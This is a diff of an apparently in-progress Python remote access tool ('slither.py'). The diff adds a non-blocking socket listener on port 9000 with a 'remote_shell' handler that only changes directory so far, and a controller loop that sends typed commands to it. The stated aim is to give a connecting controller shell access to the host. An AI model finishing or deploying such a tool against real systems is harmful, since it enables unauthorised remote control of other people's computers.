@@ -4,16 +4,20 @@ This tools behaviour is made to call out to a pre-specified host and port if the
 are not connected yet and provide shell access once connected.
 """
 
-import socket
-import sys
 import argparse
+import os
+import selectors
+import shlex
+import socket
+import subprocess
+import sys
 
 
-# TODO: Make remote socket non blocking, keep remote socket open after receiving message
+sel = selectors.DefaultSelector()
+
 
 # Rat socket, listens on port and waits for a connection.
 def remote_sock():
-    connection = True
     address = '127.0.0.1'
     port = 9000
 
@@ -22,14 +26,34 @@ def remote_sock():
     print(f"[*] Bound to {address} at port {port}")
     rat_socket.listen()
     print(f"[*] Listening")
-    while connection:
-        conn, addr = rat_socket.accept()
-        client_msg = conn.recv(1024)
-        print(client_msg.decode())
-        if client_msg.decode() == 'connection.close':
-            connection = False
+    rat_socket.setblocking(False)
+    sel.register(rat_socket, selectors.EVENT_READ, accept_connection)
+
+
+def accept_connection(rat_socket):
+    conn, addr = rat_socket.accept()
+    print('Connected', addr)
+    conn.setblocking(False)
+    sel.register(conn, selectors.EVENT_READ, remote_shell)
+
+
+def remote_shell(conn):
+    try:
+        rmsg = conn.recv(1024)
+        if rmsg:
+            commands = shlex.split(rmsg.decode())
+            if commands[0] == 'cd':
+                os.chdir(commands[1])
+                new_dir = os.getcwd()
+                conn.send(new_dir.encode())
         else:
-            continue
+            print('Client disconnected')
+            sel.unregister(conn)
+            conn.close()
+    except Exception as e:
+        print('Error', e)
+        sel.unregister(conn)
+        conn.close()
 
 
 # Controller socket, connects to rat socket and receives a shell.
@@ -40,13 +64,19 @@ def controller():
     try:
         client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_sock.connect((address, port))
-        client_sock.send(b'connection.close')
-        client_sock.close()
+        client_connup = True
+        while client_connup:
+            ccmd = input('command: ')
+            client_sock.send(ccmd.encode())
+            msg = client_sock.recv(1024)
+            if msg:
+                print(msg.decode())
+            else:
+                client_connup = False
     except ConnectionRefusedError:
         print('CONNECTION REFUSED')
 
 
-# TODO: 1) Check if we are the RAT or client, execute program accordingly.
 parser = argparse.ArgumentParser(
     prog='slither.py',
     formatter_class=argparse.RawDescriptionHelpFormatter, description='''
@@ -69,10 +99,9 @@ if __name__ == "__main__":
     else:
         controller()
 
-# TODO: 3) If RAT, create a shell and provide it to the client
 
-# TODO: 4) If client, create socket and wait for RAT to send shell
-
-# TODO: 5) extras...
-
-#  TODO: FIX MY TODO's
+while True:
+    events = sel.select(timeout=None)
+    for key, mask in events:
+        callback = key.data
+        callback(key.fileobj)
